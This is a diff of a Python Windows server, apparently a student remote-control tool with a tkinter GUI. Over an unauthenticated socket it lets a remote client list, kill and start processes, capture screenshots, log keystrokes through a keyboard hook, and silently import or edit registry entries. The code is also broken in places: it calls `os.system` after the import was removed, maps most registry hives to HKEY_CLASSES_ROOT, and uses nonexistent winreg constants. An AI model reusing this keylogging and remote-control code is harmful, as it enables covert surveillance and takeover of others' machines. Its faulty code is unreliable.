@@ -1,20 +1,22 @@
+#=============================== ADD LIBRARIES ===============================#
 from tkinter import *
 from socket import *
 from threading import Thread
-import threading
-import time
-import pyautogui
-import os
-import signal
-import wmi
-import win32gui
-import win32process
+from pyautogui import screenshot
+from os import kill, startfile, system
+from signal import SIGTERM
+from wmi import WMI
+from win32gui import IsWindowVisible, IsWindowEnabled, EnumWindows
+from win32process import GetWindowThreadProcessId
 import win32pdhutil
-import pythoncom
+from pythoncom import CoInitialize
 from pynput import keyboard
+import winreg
+import pathlib
+
+
 
 #=============================== Define control code ===============================#
-
 QUIT             =  '0'
 PROCESS_RUNNING  =  '1'
 APP_RUNNING      =  '2'
@@ -24,12 +26,25 @@ KEYSTROKE        =  '5'
 EDIT_REGISTRY    =  '6'
 EXIT             =  '7'
 
-KILL             =  'K'
-START            =  'S'
-VIEW             =  'V'
-HOOK			 =  'H'
-UNHOOK			 =  'U'
-PRINT            =  'P'
+
+CONTENT          =  'C'          # Send content of reg file from client
+                                 #_____________________________________________________________________
+EDIT             =  'E'          # Include: get value, set value, delete value, create key, delete key
+                                 #_____________________________________________________________________
+HOOK			 =  'H'          # Start hooking keyboard
+                                 #_____________________________________________________________________
+KILL             =  'K'          # Kill a process or an application
+                                 #_____________________________________________________________________
+PRINT            =  'P'          # Print hooked key
+                                 #_____________________________________________________________________
+START            =  'S'          # Start a process or an application
+                                 #_____________________________________________________________________
+TAKE             =  'T'          # Take a screenshot
+                                 #_____________________________________________________________________
+UNHOOK			 =  'U'          # Stop hooking keyboard
+                                 #_____________________________________________________________________
+VIEW             =  'V'          # View list processes or applications
+
 
 #=============================== +++++++++++++++++++++++++ ===============================#
 
@@ -45,8 +60,12 @@ def Process(Client_socket):
 	while True:
 		Code = Client_socket.recv(1).decode("utf8")
 		if (Code == VIEW):
-			pythoncom.CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
-			f = wmi.WMI()
+
+			# Running Windows functions in threads can be tricky since it often involves COM objects.
+			CoInitialize()
+			f = WMI()
+
+			# Get data from excute query sentence
 			processes = f.ExecQuery('select Name, ProcessId, ThreadCount from Win32_Process')
 			for p in processes:
 				Client_socket.sendall(bytes(str(p.ProcessId),"utf8"))
@@ -58,12 +77,13 @@ def Process(Client_socket):
 				Client_socket.sendall(bytes(str(p.ThreadCount),"utf8"))
 				Client_socket.recv(1)
 
+			# Announce to client is end of list
 			Client_socket.sendall(bytes('__END__',"utf8"))
 		elif Code == KILL:
 			Client_socket.sendall(bytes('1','utf8'))
 			try:
 				pid = int(Client_socket.recv(100).decode('utf8'))
-				os.kill(pid,signal.SIGTERM)
+				kill(pid,SIGTERM)
 				Client_socket.sendall(bytes('1','utf8'))
 			except:
 				Client_socket.sendall(bytes('0','utf8'))
@@ -71,7 +91,7 @@ def Process(Client_socket):
 			Client_socket.sendall(bytes('1','utf8'))
 			try:
 				name = Client_socket.recv(100).decode('utf8')
-				os.startfile('"C:/Windows/System32/' + name + '.exe"')
+				startfile('"C:/Windows/System32/' + name + '.exe"')
 				Client_socket.sendall(bytes('1','utf8'))
 			except:
 				Client_socket.sendall(bytes('0','utf8'))
@@ -81,15 +101,15 @@ def Process(Client_socket):
 
 def get_hwnds_for_pid (pid):
 	def callback (hwnd, hwnds):
-		if win32gui.IsWindowVisible (hwnd) and win32gui.IsWindowEnabled (hwnd):
-			_, found_pid = win32process.GetWindowThreadProcessId (hwnd)
+		if IsWindowVisible (hwnd) and IsWindowEnabled (hwnd):
+			_, found_pid = GetWindowThreadProcessId (hwnd)
 			if found_pid == pid:
 				hwnds.append (hwnd)
 		return True
 		pass    
   
 	hwnds = []
-	win32gui.EnumWindows (callback, hwnds)
+	EnumWindows (callback, hwnds)
 	return hwnds
 	pass
 
@@ -97,8 +117,8 @@ def App(Client_socket):
 	while True:
 		Code = Client_socket.recv(1).decode("utf8")
 		if (Code == VIEW):
-			pythoncom.CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
-			f = wmi.WMI()
+			CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
+			f = WMI()
 			for process in f.ExecQuery('select Name , ProcessId , ThreadCount from Win32_Process '):
 				t = get_hwnds_for_pid(process.ProcessId)
 				if (len(t) != 0):
@@ -116,7 +136,7 @@ def App(Client_socket):
 			Client_socket.sendall(bytes('1','utf8'))
 			try:
 				pid = int(Client_socket.recv(100).decode('utf8'))
-				os.kill(pid,signal.SIGTERM)
+				kill(pid,SIGTERM)
 				Client_socket.sendall(bytes('1','utf8'))
 			except:
 				Client_socket.sendall(bytes('0','utf8'))
@@ -124,7 +144,7 @@ def App(Client_socket):
 			Client_socket.sendall(bytes('1','utf8'))
 			try:
 				name = Client_socket.recv(100).decode('utf8')
-				os.startfile('"C:/Windows/System32/' + name + '.exe"')
+				startfile('"C:/Windows/System32/' + name + '.exe"')
 				Client_socket.sendall(bytes('1','utf8'))
 			except:
 				Client_socket.sendall(bytes('0','utf8'))
@@ -135,9 +155,10 @@ def take_picture(Client_socket):
 	while True:
 		Code = Client_socket.recv(1).decode("utf8")
 		# Take picture
-		if (Code == "1"):
+		if (Code == TAKE):
 			#screen capture
-			myScreenshot = pyautogui.screenshot()
+			# myScreenshot = pyautogui.screenshot()
+			myScreenshot = screenshot()
 			f = myScreenshot.tobytes()
 			sizef = f.__sizeof__()
 
@@ -168,6 +189,15 @@ def keystroke(Client_socket):
 		nonlocal unhook
 		nonlocal text
 		if not unhook:
+			key = key.replace("'","")
+			if key == "Key.enter":
+				key = "\n"
+			if key == "Key.space":
+				key = " "
+			if key == "Key.tab":
+				key = "\t"
+			if key == "Key.backspace":
+				key = "\b"
 			text += str(key)
 			print(text)
 		else:
@@ -205,15 +235,166 @@ def keystroke(Client_socket):
 			break
 
 
+def edit_registry(Client_socket):
+	while True:
+		print('do edit registry')
+		Code = Client_socket.recv(1).decode("utf8")
+
+		if (Code == CONTENT):
+			# s : data
+			print("bat dau")
+			s = Client_socket.recv(5000).decode("utf8")
+			Client_socket.sendall(bytes('1', 'utf8'))
+
+			print("nhan oke")
+			fileReg = open('fileReg.reg', 'w')
+			fileReg.write(s)
+			fileReg.close()
+			Link = str(pathlib.Path(__file__).parent.absolute()) + 'fileReg.reg'
+			test = True
+			try:
+				os.system("C:\\Windows\\regedit.exe /s \"" + Link + "\"")
+			except:
+				test = False
+			if test:
+				# sua thanh cong
+				Client_socket.sendall(bytes('1', 'utf8'))
+			else:
+				# sua that bai
+				Client_socket.sendall(bytes('0', 'utf8'))
+			Client_socket.recv(1).decode('utf8')
+		elif (Code == QUIT):
+			return
+		elif (Code == EDIT):
+			print("start")
+			option = Client_socket.recv(100).decode('utf8')
+			Client_socket.sendall(bytes("1", "utf8"))
+			print(option)
+
+			link = Client_socket.recv(100).decode('utf8')
+			Client_socket.sendall(bytes("1", "utf8"))
+			print(link)
+
+			valueName = Client_socket.recv(100).decode('utf8')
+			Client_socket.sendall(bytes("1", "utf8"))
+			print(valueName)
+
+			value = Client_socket.recv(100).decode('utf8')
+			Client_socket.sendall(bytes("1", "utf8"))
+			print(value)
+
+			typeValue = Client_socket.recv(100).decode('utf8')
+			Client_socket.sendall(bytes("1", "utf8"))
+			print(typeValue)
+
+			s = 'error'
+
+			# xu li link
+			if 'HKEY_CURRENT_USER' in link:
+				hkey = winreg.HKEY_CURRENT_USER
+				sub_key = link[18:]
+			elif 'HKEY_CLASSES_ROOT' in link:
+				hkey = winreg.HKEY_CLASSES_ROOT
+				sub_key = link[18:]
+			elif 'HKEY_LOCAL_MACHINE' in link:
+				hkey = winreg.HKEY_CLASSES_ROOT
+				sub_key = link[19:]
+			elif 'HKEY_USER' in link:
+				hkey = winreg.HKEY_CLASSES_ROOT
+				sub_key = link[10:]
+			elif 'HKEY_CURRENT_CONFIG' in link:
+				hkey = winreg.HKEY_CLASSES_ROOT
+				sub_key = link[20:]
+
+			print("do ne!!")
+			
+
+			if (option == 'Get value'):
+				key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
+				s = winreg.QueryValueEx(key, valueName)[0]
+				winreg.CloseKey(key)
+			elif (option == 'Set value'):
+				key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
+				print(1)
+				type_value = ReturnWirg(typeValue)
+				print(2)
+				winreg.SetValue(key, valueName, type_value, value)
+				print(3)
+				s = 'oke'
+				winreg.CloseKey(key)
+			elif (option == 'Delete value'):
+				key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
+				winreg.DeleteValue(key, valueName)
+				s = 'oke'
+				winreg.CloseKey(key)
+			elif (option == 'Create key'):
+				print(1)
+				key1 = winreg.ConnectRegistry(None, hkey)
+				print(2)
+				winreg.CreateKey(key1, sub_key)
+				s = 'oke'
+			elif (option == 'Delete key'):
+				key1 = winreg.ConnectRegistry(None, hkey)
+				winreg.DeleteKey(key1, sub_key)
+				s = 'oke'
+				winreg.CloseKey(key1)
+
+			# try:
+			# 	if (option == 'Get value'):
+			# 		s = winreg.QueryValueEx(key, valueName)[0]
+			# 	elif (option == 'Set value'):
+			# 		type_value = ReturnWirg(typeValue)
+			# 		winreg.SetValue(key, name, type_value, value)
+			# 		s = 'oke'
+			# 	elif (option == 'Delete value'):
+			# 		winreg.DeleteValue(key, valueName)
+			# 		s = 'oke'
+			# 	elif (option == 'Create key'):
+			# 		key1 = winreg.ConnectRegistry(None, hkey)
+			# 		winreg.CreateKey(key1, sub_key)
+			# 		s = 'oke'
+			# 		winreg.CloseKey(key1)
+			# 	elif (optin == 'Delete key'):
+			# 		key1 = winreg.ConnectRegistry(None, hkey)
+			# 		winreg.DeleteKey(key1, sub_key)
+			# 		s = 'oke'
+			# 		winreg.CloseKey(key1)
+			# except:
+			# 	s = 'error'
+			# 	print('loi')
+			# finally:
+			# 	winreg.CloseKey(key)
+			print(s)
+			Client_socket.sendall(bytes(s, 'utf8'))
+			tempt = Client_socket.recv(1).decode('utf8')
+
+
+def ReturnWirg(name):
+	if (name == 'String'):
+		return winreg.REG_SZ
+	if (name == 'Binary'):
+		return winreg.BINARY
+	if (name == 'DWORD'):
+		return winreg.DWORD
+	if (name == 'QWORD'):
+		return winreg.QWORD
+	if (name == 'Multi-String'):
+		return winreg.MULTI_SZ
+	if (name == 'Expandable String'):
+		return winreg.EXPAND_SZ
+	return None
+
+
+
 def Shutdown_Computer():
 	print('shutdown')
-	# os.system("shutdown /s /t 30")
+	# system("shutdown /s /t 30")
 
 def accept_incoming_connection():
 	while True:
 		try:
 			Client_socket, Client_add = Server.accept()
-			Z = threading.Thread(target=Run,args=(Client_socket,Client_add,))
+			Z = Thread(target=Run,args=(Client_socket,Client_add,))
 			Z.daemon = True # thread exit automatically when the main thread dies
 			Z.start()
 		except Exception as e:
@@ -267,7 +448,7 @@ def Run_Program(label1):
 		label1.configure(fg='green')
 		Server.bind(Address)
 		Server.listen(5)
-		Z = threading.Thread(target=accept_incoming_connection)
+		Z = Thread(target=accept_incoming_connection)
 		Z.daemon = True # thread exit automatically when the main thread dies
 		Z.start()
 
